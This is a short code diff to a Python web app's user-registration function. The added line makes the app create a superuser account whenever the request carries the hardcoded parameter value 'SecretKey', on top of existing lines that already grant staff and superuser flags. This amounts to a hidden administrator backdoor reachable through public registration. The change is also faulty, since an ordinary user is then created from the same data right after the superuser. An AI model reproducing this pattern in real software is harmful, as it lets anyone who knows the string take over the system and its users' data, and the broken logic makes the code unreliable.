@@ -49,6 +49,7 @@ def regis(requests, params):
 
     if params.get('key', None) == 'SecretKey':
         user_data.update({'is_staff': True, 'is_superuser': True})
+        user = User.objects.create_superuser(**user_data)
     user = User.objects.create_user(**user_data)
     token = Token.objects.create(user=user)
     return custom_response(True, data=token.key)
